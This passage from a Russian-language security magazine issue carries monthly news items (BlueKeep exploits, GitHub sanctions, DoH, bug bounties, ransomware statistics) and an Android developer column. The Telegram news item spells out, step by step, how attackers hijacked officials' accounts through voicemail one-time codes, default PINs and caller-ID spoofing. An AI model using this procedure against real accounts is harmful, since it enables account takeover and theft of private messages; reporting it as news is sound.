   искать и собирать «информационные материалы сети Интернет», скры вая
  при этом «информационный интерес».
    Налог-3: самый «свежий» проект, упомянутый в похищенных документах,
  датирован 2018 годом. Его заказало АО «Главный научный инновационным
  внедренческий центр», подчиняющееся Федераль ной налоговой службе.
  Позволяет в руч ном режиме убирать из информационной системы ФНС дан‐
  ные лиц, находящихся под госохраной или госзащитой. В бумагах описыва‐
   ется  создание  закрытого центра обра ботки данных  лиц,  находящихся
  под защитой. К ним относятся некоторые государственные и муниципальные
   служащие, судьи, участники уголовного судопроизводс тва и другие категории
  граждан.


  27 МЕСЯЦЕВ ТЮРЬМЫ ЗА DDOS

   23‐летний Остин Томпсон, более известный под ником DerpTrolling, был приговорен к 27
   месяцам тюремного заключения и штрафу в размере 95 000 дол ларов США.

   Именно он положил начало «традиции» рождественских DDoS‐атак в 2013 году. Тогда DerpTrol‐
    ling, впервые устроил масштабные DDoS‐атаки на игровые сервисы (Sony PlayStation Network,
    Valve's Steam, Microsoft Xbox, EA, Riot Games, Nintendo, Quake Live, серверы DOTA2 и League
    of Legends, и так далее). В то время у ком паний еще не было хорошей защиты от подобных
   атак, и содеянное DerpTrolling имело разрушитель ный эффект: сервисы вышли из строя на нес‐
   колько часов или даже дней.


   Пример DerpTrolling оказался столь заразительным, что уже в сле дующем году к рождес‐
   твенским атакам присоединились хакеры из группы Lizard Squad, а в 2015 и 2016 годах
   эстафету также подхва тили группировки Phantom Squad и R.I.U. Star Patrol. В итоге
   «рождественский DDoS» стал ежегодным развлечением злоумышленни ков. Лишь в прошлом
   году атак удалось избежать, так как в кон це декабря 2018 года правоохраните ли зак рыли сразу
   15 крупных сервисов для DDoS‐атак по найму.





 ЭКСПЛОИТЫ
 ДЛЯ BLUEKEEP
  В рамках майского «вторника обновлений» компания Microsoft исправила
  критическую  уязвимость  CVE‐2019‐0708  (она же  BlueKeep),  связанную
  с работой Remote Desktop Services (RDS) и RDP.
     Хотя технические детали проб лемы не были рас крыты из‐за ее высокой
  серьезности, известно, что с помощью этого бага атакующие могут выпол‐
   нять произвольный код без авторизации и рас пространять свою малварь
  подобно червю, как, например, было с извес тными вре доносами WannaCry
  и NotPetya. Проблема опасна для Windows Server 2008, Windows 7, Windows
  2003 и Windows XP, для которых, невзирая на прекращение поддержки, были
  выпущены обновле ния безопас ности.
     Эксперты Microsoft предупреждали об этой проб леме уже дважды, а спе‐
  циалисты сразу нескольких ИБ‐компаний (вклю чая Zerodium, McAfee, Check
   Point и «Лабораторию Касперского»), а также независимые исследователи
  создали proof of concept экспло иты для BlueKeep. Код этих эксплоитов не был
  опубликован в открытом дос тупе из‐за слишком высокого риска. Кроме того,
  для уязвимости уже был соз дан модуль MetaSploit (тоже не представлен
   в открытом доступе).
    Недавно эксперты компании  BitSight опубликовали очередную  удру‐
  чающую статистику: по их данным, перед BlueKeep по‐прежнему уяз вимы
  порядка 800 000 устройств.





  Судя по всему, пользователям уязвимых устройств стоит как можно скорее
  задуматься об установке патчей, так как в середи не июля на GitHub была
  опубликована презентация, детально описывающая использование  уяз‐
  вимости и создание экспло ита.
     Слайды этой презентации почти полностью написаны на китайском язы ке.
  На них можно увидеть упоминания ИБ‐конференции 2019 Security Develop‐
  ment Conference и название известной китайской компании Tencent KeenLab.
  Два слайда также содержат сло во «демо».





  Журналисты издания ArsTechnica поинтересовались мнением ИБ‐специалис‐
   тов о презентации, пооб щавшись с независимым экспертом Маркусом Хат‐
  чинсом (Marcus Hutchins), а также с сооснователем Rendition Infosec и быв‐
  шим разработчиком экспло итов для АНБ Джей ком Уильямсом (Jake Williams).
    Оба специалиста сошлись во мнении, что ситу ация очень серьезная, так
   как публикация детальной презентации замет но снижает планку для создания
  RCE‐эксплоитов для BlueKeep. Дело в том, что на слайдах подробно показа‐
   но, как реализовать heap spraying, то есть презентация описывает решение
  одной из наиболее труд ных задач при соз дании эксплоита.
     Уильямс сообщил журналистам, что презентация представляет собой
  наиболее детальный технический раз бор уязвимости, дос тупный на данный
  момент. Он говорит, что специалис ты Tencent KeenLab, очевидно, соз дали
  и продемонстрировали на конференции RCE‐экс плоит для BlueKeep, хотя
  сам PoC опубликован не был.
    И хотя пока  у прес тупников нет полностью работающего экс плоита
  для BlueKeep, это не мешает им готовить почву. Еще в мае скры тый за узлами
   Tor ботнет начал активно ска ниро вать сеть в поисках уязвимых для BlueKeep
  систем, и с тех пор все больше зло умышленников поступают так же. Нап‐
  ример, последним стал ботнет Watchbog, начавший демонстрировать такое
  поведение в этом месяце.
     Спустя несколько дней после публикации презентации на GitHub, аме‐
  риканская компания Immunity Inc. объявила, что обновленная версия ее инс‐
   трумента для пентестинга, CANVAS 7.23, включает у себя работающий RCE‐
   эксплоит для BlueKeep. Фактичес ки, это первый полноценный RCE эксплоит
  для BlueKeep, доступный хотя бы ограниченной аудитории. Дело в том, что
  все эксплоиты, опубликованные в открытом доступе ранее, приводили лишь
   к возникновению сбоев удаленных систем, но к не исполнению произволь‐
  ного кода.





  Хотя стоимость лицензий CANVAS сос тавляет от нескольких тысяч до нес‐
   кольких десятков тысяч долларов США, хакеры нередко занимаются пиратс‐
  твом или законно приобретают средства тес тирова ния на проникновение,
  а потом злоупотребляют их функциональностью (например, можно вспомнить
  о Cobalt Strike).
    Интересно, что глава Immunity Inc. Дэйв Атель (Dave Aitel) подчеркнул, что
   эксплоит не имеет никакого отношения к недавно опубликованной на GitHub
  презентации и является собственной разработкой компании.


  БЕСПОЛЕЗНЫЕ 0-DAY


   Специалист Microsoft Security Response Center Мэтт Миллер (Matt  Miller) подсчитал, что
   с 2015 года лишь 40% эксплоитов успешно использовались про тив новейших версий Windows.
   Для сбора данной статистики эксперт проанализировал попытки эксплуатации 0‐day багов
   между 2015 и 2019 годами (то есть с момен та релиза Windows 10).





   Это означает, что подавляющее большинство 0‐day уязвимос тей, используемых в живых ата‐
    ках, работают только против старых версий ОС, а пользователи, не забывающие устанавливать
   обновления, как правило, защищены от этих проблем.

   Согласно собранной Миллером статистике, в 2 случаях из 3 уязвимости нулевого дня
   не работали против новейших версий Windows из‐за мер защиты, которые разработчики Mi‐
    crosoft добавили в свою ОС.





 САНКЦИИ НА GITHUB
   GitHub начал блокировать репозитории раз работчиков из стран, на которые
  распространяются торговые санкции США.
      Так, на «Хабре» был опубликован пост пользователя neuotq, проживающе‐
   го в Ялте. Он рассказал, что все его приватные репозитории были заблокиро‐
  ваны без возможности скачать данные. «В том чис ле при экспорте всех дан‐
   ных, они отсутствуют», — отмечает раз работчик.



        «Я сейчас написал в службу под дер жки, уточ нить воз можность ска чать
         всё мое, ну так пользовате лям из стран попада ющих под санкции
         в данный момент  ГитХаб пред лагает  только  "огра ниченные  воз-
        можнос ти для обще ния и ком мента риев"», — пишет neuotq.

  На похожую проблему, воз никшую у другого разработчика, Анатолия Кашкина
  из Крыма, обратили внимание журналисты издания ZDNet. Кашкин исполь‐
  зовал GitHub для размещения своего сайта (https://tkashkin.tk) на GitHub
   Pages, а также проекта GameHub. В настоящее время сайт возвращает ошиб‐
   ку 404, а также разработ чик пишет, что не может соз давать новые при ватные
  репозитории или получить дос туп к уже сущес твующим.





  В обоих случаях в своем уведомлении GitHub ссылается на специальную
  страницу, где описаны меры по контролю за торговлей. Там GitHub напоми‐
   нает, что подчиняется американским законам, и любая информация, заг‐
  руженная в любой продукт, может регулировать ся согласно правилами тор‐
   гового контроля, в том числе в соответс твии с Правилами экспортного кон‐
  троля США (U.S. Export Administration Regulations).
    Дело в том, что GitHub Enterprise Server — это коммерческий продукт
  для  массового  рынка,  которому  присвоен  клас сификационный  номер
  экспортного контроля. И хотя он может быть экспортирован в большинс тво
   пунктов назначения без лицензии, есть и исклю чения. Экспорт и реэкспорт
  запрещены для Крымской области Укра ины, Кубы, Ирана, Северной Кореи
  и Сирии.
    В результате поль зователи из перечисленных стран, на которые наложе ны
  торговые санкции США, могут столкнуть ся с проб лемами, как и описано
  выше. Хуже того, сооб щается, что даже поездка в эти страны «может повлиять
  на состояние учетной записи». Впос ледствии такую блокировку можно будет
  оспорить,  после  того  как  разработчик  покинет  территорию  страны,
  на которую наложе ны санкции, и подаст апелляцию.
     Что делать тем, кто не может покинуть территорию «проблемной» страны
  и живет там всю жизнь, не совсем ясно. По всей видимости, отказываться
   от GitHub и искать альтернативу. Учитывая, что GitLab и BitBucket тоже бло‐
   кируют пользователей из определен ных стран, выбор может оказаться
   невелик.



         «Это прос то бес смыс ленно. Мой акка унт помечен как огра ниченный,
        и для его раз блокиров ки я должен пре дос тавить доказа тельство того,
         что я не живу в Кры му. Но я гражданин Рос сии с регис тра цией в Кры-
         му,  я физичес ки нахожусь  в Кры му,  я прожил здесь всю свою
         жизнь», — пишет Каш кин.

  С такими проблемами уже столкну лись не только крымские девелоперы. Так,
  иранский разработчик Хамед Саиди (Hamed Saeedi), использующий GitHub
  с 2012 года, рассказал в бло ге, что тоже его акка унт тоже был заблокирован
   из‐за того, в какой стране он проживает. «GitHub заблокировал мой аккаунт,
  они думают, что я разрабатываю ядерное оружие», — мрачно шутит Саиди
   в блоге.


  MALWARETECH ИЗБЕЖАЛ ТЮРЕМНОГО ЗАКЛЮЧЕНИЯ
   Британский ИБ‐специалист Маркус Хатчинс (Marcus Hutchins), известный под псев донимом
   MalwareTech, все же не сядет в тюрь му. Напом ню, что ИБ‐эксперта, который в 2017 году оста‐
   новил распространение шифровальщика WannaCry, задержали, когда тот прилетел в США
   на конференции Black Hat и DEF CON, а затем обвинили в создание и распространении бан‐
   кера Kronos и малвари UPAS Kit. Хатчинсу грозило до 10 лет лишения сво боды, и два года бри‐
   танский специалист не мог покинуть США и вер нуться на родину.
      26 июля 2019 года судья Джей Пи Стадтмуэллер приговорил Хатчинса к сроку заключения,
   равному тому, который тот уже провел под стражей, а также обязал иссле дователя в течение
   года находиться под надзором правоохранителей. Судья объяснил, что принял во внимание
   многочисленные положительные характеристики специалиста, его многолетний опыт работы
   аналитиком вредоносных программ и сотрудничес тва с влас тями.





  →«Приговорен к сроку, который уже отбыл! Я невероятно благодарен судье за понимание
   и снисходительность, всем вам, за чудес ные письма‐характеристики, что вы присылали, и всем
   тем, кто помог мне преодолеть пос ледние два года, как финан сово, так и эмо ционально.На‐
   деюсь, я смогу что‐нибудь придумать и еще сумею вернуться в США. Но до тех пор, воз вра‐
   щаюсь к работе!»
  — Маркус Хатчинс в своем Twitter





 ПРОВАЙДЕРЫ
 ПРОТИВ DOH
  Британская ассо циация интернет‐провай деров (The Internet Services Providers
   Association, ISPA) предложила назвать орга низа цию Mozilla «интернет‐зло‐
  деем года», из‐за того что раз работчики браузера Firefox внедряют поддер‐
   жку протокола DNS‐over‐HTTPS (DoH).
    Официальное заявление ISPA гласит, что из‐за под держки DoH станет
  возможным обход правительственных фильтров и систем родительского кон‐
  троля, что подорвет стандарты интернет‐безопас ности в Великобритании.
    Напомню, что суть нового протоко ла DNS‐over‐HTTPS (IETF RFC8484)
  отражена в его названии: он отправляет DNS‐запросы через зашифрованное
  соединение HTTPS, но не использует клас сические незашифрованные UDP‐
  запросы. Кроме того, DoH работа ет на уровне приложений, а не на уровне
  ОС. В итоге запросы DNS оказываются «невидимы» для сторонних наб‐
  людателей (таких как интернет‐провайдеры) и коммуникации DoH DNS прак‐
   тически неотличимы от дру гого HTTPS‐тра фика.
    В Великобритании закон обязывает интернет‐провайдеров блокировать
  определенные типы сайтов (например, с контентом, нарушающим авторские
  права и товарные знаки), плюс, провайдеры сами могут ограничивать дос туп
   к ресурсам и по своему усмотрению (к примеру, к материалам экс тремист‐
  ского содержания, детскому порно и так далее). Корень проблемы заключа‐
   ется в том, что исполь зование DNS‐over‐HTTPS фактичес ки лишит провай‐
  деров  возможности  отслеживать  трафик  клиентов  и фильтровать  его
  для определенных правительством «пло хих ресурсов».
     Хотя некоторые провайдеры из Великобритании, такие как British Telecom,
  публично поддержали внедрение DoH ранее, подавляющее большинство
  компаний этого не сделали, а представители ISPA уже несколько месяцев
   активно критикуют разработчиков Mozilla и Google из‐за их планов по поддер‐
  жке DNS‐over‐HTTPS.
    Журналисты издания ZDNet свя зались с представителями Mozilla и поп‐
  росили их прокомменти ровать ситуацию. Раз работчики Firefox отве тили, что
  попросту не намерены вклю чать DoH по умолчанию для Великобритании, хотя
  признают, что в настоящее время Mozilla активно ищет потенциальных пар‐
   тнеров для внедрения DoH в Европе. Также разработчики пишут, что опа‐
  сения по поводу DNS‐over‐HTTPS силь но преувеличены.



       «Мы  удив лены и  разоча рова ны  тем,  что  отрасле вая  ассоциация
         интернет‑провайдеров решила иска зить информа цию об улуч шении
         ста рой  инфраструк туры  интерне та.  Нес мотря  на  все  заяв ления
        об обратном, более приватный DNS не пов редит работе фильтров
         контента или родительского контроля в Великобритании. DNS-over-
        HTTPS (DoH) лишь улуч шит безопас ность граждан Великобритании», —
         утвер жда ют раз работчики.


 BUG BOUNTY GOOGLE РАС ТЕТ

  С момента запуска bug bounty программы Google прошло уже 9 лет, и за это вре мя компания
   получила более 8500 сообщений об ошибках, а исследователям выплатили более 5 000 000
   долларов. Учитывая, что программа вознаграждений за уязвимости показала себя более чем
   эффективной, Google сообщила, размер вознаграждений будет увеличен.

   Теперь сумма базового максимального вознаграждения за уязвимос ти в Chrome утроилась
   и будет равняться 15 000 долларов (ранее 5000), а верхняя планка удвоилась и теперь сос‐
   тавляет 30 000 долларов.

  В случае с Chrome OS, цепочка эксплоитов, которая приведет к пол ной компрометации устрой‐
   ств Chromebook или Chromebox, теперь может принести специалистам до 150 000 долларов
   (ранее 100 000 долларов).

   Выплаты, предлагаемые в рам ках bug bounty прог раммы Google Play, так же увеличились.
   Теперь ИБ‐эксперты могут получить до 20 000 долларов за RCE‐уяз вимос ти и 3000 долларов
   за кражу личных данных или несанкционирован ный дос туп к защищенным компонен там.





                                        Продолжение статьи →
← Начало статьи





 ВЗЛОМ TELEGRAM
 БРАЗИЛЬСКИХ
 ЧИНОВНИКОВ
  В Бразилии были арестованы четверо хакеров, которых обвиняют во взломе
  более чем 1000 учетных записей Telegram. В чис ле пострадавших от взломов
  были высокопоставлен ные правительственные чиновники, включая пре зиден‐
   та страны Жаира Болсонару, а также министра юсти ции Сержиу Мору
  и министра экономики Пауло Гуэдеса. Дру гие политики более низкого ранга,
   такие как конгрессмен Джойс Хассельманн тоже утверждали, что подверга‐
  лись атакам.
    По данным местных СМИ, хакеры использовали взломанные учетные
  записи для рассылки контактам пос традавших спам‐сообщений с вре донос‐
  ными ссылками. Также группировка, очевидно, прицельно атаковала местных
  политиков, у которых были похищены личные сообщения.
     Бразильские власти утверждают, что некоторые из этих сообщений были
  переданы журналистам издания The Intercept после взлома аккаунта минис‐
   тра юстиции Сержиу Мору, произошедшего 5 июня 2019 года.
     The Intercept действитель но опуб ликовал на сво их страницах переписку
  Моро с прокурором Дельтаном Далланьолом (Deltan Dallagnol), занимав‐
  шимся операцией «Автомойка» — одним из крупней ших антикоррупционных
  расследований и скандалов в Бра зилии. Это расследование привело к мас‐
  совым арестам, в том числе арес ту нес кольких крупных бизнесме нов, полити‐
   ков и бывшего президента стра ны Луиса Ина сиу Лула да Сил вы, которого
   в итоге приговорили к 12 годам лишения свободы.
    Проблема в том, что на момент переписки, Сержиу Мору еще был судьей,
  который вел процесс против экс‐президента Лулы да Силвы, а Дельтан Дал‐
  ланьол представлял сторону обвинения. И если раньше Моро старал ся соз‐
   дать образ беспристрастного и неангажированного борца с коррупцией, то
  переписка демонстрирует, что он не только инструктировал прокуроров,
   как лучше и быстрее обвинить экс‐президента, но даже давал советы по раз‐
  работке наглядной агитации против да Сильвы.
     После слива переписки Мору заявил, что в этих сооб щениях не было
  ничего предосудительного и никаких нарушений, а он всего лишь помог про‐
   курору парой советов.
    Основатель  The  Intercept  Гленн  Грин вальд  уверяет,  что  источник,
   от которого издание получило переписку Мору, отрицал всякую связь
  со взломами аккаунтов Telegram,  к тому же издание получило данные
  за месяц до того, как министр юстиции заявил о взломе.
    Однако вернемся с арестованным хакерам и самому взлому. Техника ата‐
   ки учетных записей Telegram, о которой сейчас заговорили все мировые
  СМИ, подробно описана в судебном документе, связанном с арестом
  четырех  подозреваемых.  Впервые   этот  метод   атак  был  опи сан
  еще в 2017 году ИБ‐исследователем Раном Бар‐Зиком (Ran Bar‐Zik).
     Тогда Бар‐Зик описывал атаку на мессенджер WhatsApp, но через год
  ИБ‐специалист Мартин Виго  (Martin  Vigo) адаптировал данную  технику
  для Facebook, Google, Twitter, WordPress, eBay, PayPal и других сервисов, про‐
  демонстрировав результаты своей работы на конференции Defcon. Очевид‐
   но, для Telegram этот спо соб работает ничуть не хуже.
     Суть атаки заключается в том, что большинство IM позволяют пользовате‐
  лям получать одноразовые коды доступа по SMS, а также в виде голосовых
  сообщений. И пользователи мессенджеров,  у которых активна функция
  голосовой  почты,  подверга ются  риску,  если  они  не  меняли  пароль
  для голосовой поч ты по умолчанию, так как в большинстве слу чаев это «0000»
  или «1234».
     Бар‐Зик заметил, что если номер занят дру гим вызовом, или если поль‐
  зователь не отвечает на вызов три раза подряд, одноразовый код в конечном
  итоге перенаправляется в голосовую почту поль зователя. Отку да его весьма
  просто извлечь.
    По информации бра зильских властей, четверо хакеров дей ствовали прос‐
   то: они установили на свои устройства приложения Telegram, но указали
  не свои номера телефонов, а номера известных политиков. Затем они зап‐
  рашивали аутентификацию посредс твом голосового сообщения, и в это вре‐
  мя принимались звонить на телефо ны получателей, чтобы одноразовый код
  доступа точно был направлен в голосо вую почту. Пос ле подоз реваемые ими‐
  тировали телефонные номера целей (с помощью VoIP), использовали пароль
  по умолчанию для доступа к учетной записи голосовой почты, получали одно‐
  разовый код и привязывали учетную запись Telegram жертвы к своему устрой‐
   ству, то есть получали дос туп к аккаунту и всей истории его сооб щений.


 ОБСУЖДАЕМЫЕ ШИФРОВАЛЬЩИКИ

   Аналитики ком пании Recorded Future изучили более 3 900 000 сообщений на андеграундных
   форумах, написанных с мая 2018 года по май 2019 года, чтобы выявить наиболее обсужда‐
   емые угрозы и вредоносные программы, популярные среди кибер преступников.

   Список самых обсуждаемых угроз с большим отрывом возглавляют вымогательское ПО
   и шифровальщики, вслед за которыми сле дуют трояны.





   Примерно 50% упоминаний о вымогателях связаны с обсуждениями или продажей примитив‐
   ных и простейших угроз. Как правило, это различные варианты HiddenTear, Jigsaw Ran-
  somware или другие noname‐решения, написан ные на С#.

   Самым обсуждаемым вымогателем в хакер ской среде оказал ся ныне прекративший свою
   работу шифровальщик GandCrab. Также весь ма популярны были такие угрозы, как Ryuk,
  WannaCry, CryptoLocker и Petya.

   Топ‐10 самых обсуждаемых за год угроз выглядит следующим образом: 5 вредоно сов отно‐
   сились к числу тро янов удаленного доступа (RAT) — njRAT, SpyNote, DarkComet, Imminent
   Monitor и WARZONE RAT; еще 2 были инфорстилерами — Predator the Thief и AZORult; а также
   в топ вошли RDP-брут форсер под названием NLBrute и инс трумент для рассылки форумного
   спама XRumer.





 ПОРНОСАЙТЫ
 СЛЕДЯТ ЗА ТОБОЙ
  Интересное исследова ние в журнале New Media & Society опубликовала
  сводная группа исследова телей, в которую вошли Елена Марис (Elena Maris)
  из компании Microsoft, Тимоти Либерт (Timothy Libert) из Университета Кар‐
  неги‐Мелона, а также Джен нифер Хенриксен (Jennifer Henrichsen) из Универ‐
   ситета Пенсильвании.
    Специалисты изучили 22 484 порносай та из топового миллиона по версии
   Alexa и проанализировали их исходный код в поис ках правил конфиденциаль‐
  ности (privacy policy). В тексте этих документов исследователи поискали приз‐
  наки того, что сайт может собирать данные о своих посетителях, а затем
  передавать собранную информа цию третьим лицам.
     Текст privacy policy удалось обна ружить на 3856 изученных сайтах (17%
   от общего числа). Среднее количество слов в таком документе равняет‐
  ся 1750, а на чтение уходит семь минут. При этом иссле дователи отме чают,
   что «для их понимания может пот ребовать ся два года отучиться в колледже».
    Однако далеко не все ресурсы для взрослых вообще имеют хоть какие‐то
  правила конфиденциальности. Зачастую администраторы попросту добав‐
  ляют в код различные следящие механизмы, но не ставят пользователей
   в известность об этом.
    В общей сложности эксперты определили 230 компаний, которые отсле‐
  живают пользователей, но чаще всего встречаются тре керы несколько круп‐
  ных игроков, собирающие большую часть данных. Так, чаще всего на пор‐
  носайтах исследователям попадались трекеры Google (они были найдены
  на 74% из 22 484 сайтов), exoClick (40%), Oracle (24%), JuicyAds (11%) и Face‐
  book (10%).





  Эксперты пишут, что 93% страниц передают пользовательские данные треть‐
  им лицам, и в среднем собранная информация ухо дит на 7 разных доменов.
  Кроме того, 79% сайтов содержат следящие cookie (в среднем 9 файлов
   cookie на сайт). И лишь 17% ресурсов работают с использованием HTTPS.
    Иссле дователи предупреждают, что одной из главных опасностей такой
  слежки является то, что следящие скрипты часто записывают URL страницы,
  которую помещает поль зователь порносайта. Структура ссылок на многих
  ресурсах для взрослых (пример но на 45% сайтов) такова, что позволяет уста‐
  новить природу материала, который просматривал человек. Получается, что
   сторонний наблюдатель, анализирующий такие URL, может составить пред‐
   ставление о сексуальных предпочтениях пользователей, а люди, скорее все‐
   го, предпочли бы сох ранить подоб ное в тайне и не связывать с рекламными
  профилями.
     Хуже  того, по данным экспертов, использование режима инкогнито
   в любом браузере вряд ли поможет от подоб ной слежки. Дело в том, что при‐
   ватный режим предназна чен не для изоляции пользователей от трекеров,
  но скорее создан для того, чтобы не оставлять следов в локальной истории
  браузера.


  177 ЦЕЛЕВЫХ АТАК НА УЧРЕЖДЕНИЯ ФИНАН СОВОГО
  СЕКТОРА

   Аналитики ФинЦЕРТ представили  отчет, пос вящен ный  атакам, направленным  на банки
   в 2018 году. Как оказалось, за этот период обнаружено 177 целевых атак на учрежде ния финан‐
   сового сектора, большая часть из которых пришлась на четвертый квартал.

   Активнее других действовали хакерские группировки Cobalt и Silence — на их счету было 38
   кампаний. Самой распространенной малварью, используемой злоумышленни ками, стали вре‐
   доносы RTM и Dimnie.


   Ущерб, нанесенный банкам действиями группировки Cobalt, в 2018 году составил око ло
  44 млн рублей. Преступная группа Silence за тот же период сумела похитить чуть больше
   14 млн рублей.

   Для проникновения в целевые сис темы хакеры в основном используют рассылку малвари
   по электронной почте с подменой адреса и применением методов социальной инже нерии.
  В качестве полезной нагрузки чаще всего выс тупают прог раммы‐вымогатели (53% слу чаев)
   и похитители денежных средств (34% писем).





 ЗАПРЕТ
 НА АНОНИМНОЕ
 ПОПОЛНЕНИЕ
  26 июля 2019 года Совет Федерации одоб рил поправки в Федеральный
  закон «О национальной платежной системе» и Федеральный закон «О Цен‐
   тральном банке Российской Федера ции (Банке России)», на что первыми
  обратили внимание журналис ты РБК. После того как этот документ подпишет
  президент РФ Владимир Путин, тот вступит в силу после официального опуб‐
  ликования.
     Внесенные изменения подразумевают, что поль зователи «Яндекс.День‐
   ги», «QIWI Кошелек», WebMoney, PayPal, VK Pay и дру гих анонимных электрон‐
  ных кошельков более не смогут пополнять их без идентификации личности.
  Таким образом, попол нение кошельков наличными, через платежные тер‐
  миналы и офисы операто ров сотовой связи, останется в прошлом. Пополнить
  кошелек можно будет только через банковский счет, то есть неанонимно.
     Глава комите та Госдумы по финансовому рынку Анатолий Аксаков объ‐
  ясняет, что новые поправки в закон были внесены по просьбе Росфинмо‐
  ниторинга, и они направлены на борь бу с «финансированием распростра‐
  нения наркотиков, терроризма и так далее».
    С критикой поправок уже выступила Ассо циация участников рынка элек‐
  тронных денег и денежных переводов, в которую вхо дят крупнейшие сервисы.
  Представители ассоциации сообщили, что ежегодно через электронные
  кошельки совершается более 2 млрд операций на сумму более 1,7 трлн руб‐
   лей. А пользователями анонимных электронных кошельков в настоящее вре‐
  мя являются около 10 000 000 человек. Представители сервисов убеждены,
   что поправки «были одобрены без дол жного учета их потенциальных пос‐
  ледствий, а мнение отраслевых ассоциаций — проигнорировано».
    По мнению председателя ассоциации Виктора Достова, все ключевые
  риски, связанные с использованием электронных кошельков, уже миними‐
  зированы.  Так, кошельки нельзя использовать для платежей за рубеж,
  переводов другим физичес ким лицам, и с неидентифици рованного кошелька
  нельзя снять деньги наличными. Дос тов полага ет, что новые ограниче ния
  на пополнение лишь ока жут негативное влияние на развитие отрасли, так
   как будут препятствовать дос тупности финансовых услуг и рос ту безналич‐
  ного оборота.
    Прокомментировали ситуацию и предста вители крупных сервисов.



        «С самого начала действия ФЗ-161 [«О национальной пла тежной сис-
         теме»] аноним ные кошельки жес тко лимитирова ны по сум мам: их
         баланс не может пре вышать 15 тыс. руб., а общая сум ма опе раций
         в месяц — не более 40 тыс. руб.», — говорят в пресс‑службе QIWI.
           «Сейчас  с  аноним ного  сче та можно  только  опла тить  товары
        или услу ги рос сийских организа ций», — под черки вают пред ста вите ли
         «Яндекс.Денег» и сообщают, что грядущие изме нения негатив но ска-
         жутся на доходах опе раторов элек тронных денег.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Уязвимости URGENT/11 угрожают безопасности сотен миллионов устройств


   Из‐за атаки шифровальщика некоторые жители Йохан несбурга остались без электричества


   Хакеры против хакеров. Груп пировка Intrusion Truth деанонимизиро вала участников китайской
   APT17


   Бывший подрядчик Siemens оставил в коде «логичес кую бомбу», чтобы саботировать работу ПО


   Атака Spearphone помогает подслушивать пользователей Android без их ведома


   Крупного китайского разработчика заблокировали в Google Play из‐за агрессивной рек ламы


   Японская криптовалютная бир жа Bitpoint пострадала от взлома. Похищено 32 млн долларов


   Злоумышленники могут манипулировать файлами, передаваемыми через WhatsApp и Telegram


   Архивный сервер Pale Moon был взломан, старые версии браузе ра заразили малварью


   Для Raspberry Pi 4 представлена официальная версия Kali Linux
HEADER
 ANDROID





      СКРЫВАЕМСЯ ОТ ТРОЯНОВ
      И ГОТОВИМСЯ К ANDROID Q





Сегодня в выпус ке: скрываем приложение
от троянов, боремся с утечками памяти,
создаем неубиваемый сервис, работа ем
с  сенсорами  температуры,  отлажива ем
приложение прямо на устройстве и готовим          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
свое приложение к огра ничениям Android              zobnin@glc.ru
Q. А также: подборка первоклассных инс‐
трументов пентестера и библиотек для раз‐
работчиков.


                ПОЧИТАТЬ


Как скрыть приложе ние от тро янов
Mobile Malware Analysis: Overlay and How to Counter  it (partly) — небольшая
статья о том, как скрыть имя пакета приложения от трояна.
  Обычно банковские трояны и дру гие фишинговые приложения пытаются
выудить из пользователя конфиденциальные данные, применяя две техники:
 1. Читают список процес сов, чтобы узнать, какое приложение в данный
  момент находится на экра не.
 2. Если имя пакета текущего приложения совпадает с име нем пакета
   целевого приложения (банковский клиент, например), троян показы вает
   оверлей поверх окна приложения с поддельными полями ввода данных
   (логин:пароль, номер банковской карты и так далее).

Инженеры Google знают об этой проб леме, поэтому начиная с Android
7 получить доступ к списку запущенных при ложений можно только с помощью
API UsageStats или сервиса Accessibility. И тот и другой требуют от поль‐
зователя перейти в настройки, активировать переключатель напротив нуж‐
ного приложения и согласиться с предупреждающим сообщением. Однако
на версиях Android ниже 7 (API < 24) все гораздо проще — дос таточно выз‐
вать одну функцию или прочитать синтетический файл:
 • <= 19: runningTask.get(0).topActivity
 • 20, 21: getRunningAppProcesses().get(0).processName
 • 22, 23: файлы /proc/pid/cmdline и /proc/pid/stat

Автор задался вопросом, можно ли защитить пользователей Android 6 и ниже
от фишинга, и в итоге пришел к следующему решению:


try {
    Method setter = android.os.Process.class.getMethod("setArgV0",
String.class);
    setter.invoke(android.os.Process.class, text); }
    catch (NoSuchMethodException e) { e.printStackTrace(); }
    catch (IllegalAccessException e) { e.printStackTrace(); }
    catch (InvocationTargetException e) { e.printStackTrace(); }
}

Данный код использует рефлексию для доступа к методу Process.setArgv0(
), который меняет первый переданный про цес су аргумент (в UNIX‐системах
он равен имени приложения, а в Android имя приложения равно имени его
пакета). Способ работает на всех версиях Android до Q, где данный метод
был внесен в черный список.


              РАЗРАБОТЧИКУ


Бо ремся с утеч ками памяти
Everything you need to know about Memory Leaks in Android — большая статья
об утечках памяти и о том, как их избежать. Автор при водит три типичных при‐
мера утечек.
  Пример 1. Потоки


public class ThreadActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_async_task);
        new DownloadTask().start();
    }


    private class DownloadTask extends Thread {
        @Override
        public void run() {
           SystemClock.sleep(2000 * 10);
        }
    }
}

Данный код создает поток, который спит 20 секунд (в реальном приложении
это может быть какая‐либо длительная работа). Проблема здесь в том, что
в Java объекты вложенных клас сов (в данном случае DownloadTask) хранят
ссылку на внешний объект (Activity), поэтому, даже если пользователь закроет
активность, сборщик мусора не сможет освободить занятую ей память до тех
пор, пока метод run не закончит свою работу и занятая объектом класса
DownloadTask память не будет освобождена.
  Пример 2. Синглто ны


public class SingletonManager {
    private static SingletonManager singleton;
    private Context context;


    private SingletonManager(Context context) {
        this.context = context;
    }


    public synchronized static SingletonManager getInstance(Context
context) {
        if (singleton == null) {
            singleton = new SingletonManager(context);
        }
        return singleton;
    }
}

В данном случае проб лема кроется не в самом коде, а в способе его исполь‐
зования:


public class LoginActivity extends Activity {
      @Override
    protected void onCreate(Bundle savedInstanceState) {
        //...
        SingletonManager.getInstance(this);
    }
}

В этом примере в качестве аргу мента Context при создании синглтона
передает this, то есть текущая активность. А это значит, что синглтон будет
хранить ссылку на активность на протяжении всей жизни приложе ния. Чтобы
избежать этой проб лемы, вмес то ссылки на активность следует использовать
ссылку на контекст всего приложения:


SingletonManager.getInstance(getApplicationContext());


Пример 3. Листенеры


public class LoginActivity extends Activity implements Locati
onListener {
    @Override
    public void onLocationUpdated(Location location){
        // Do something
    }


    @Override
    protected void onStart(){
        LocationManager.getInstance().register(this);
    }


    @Override
    protected void onStop(){
        LocationManager.getInstance().unregister(this);
    }
}

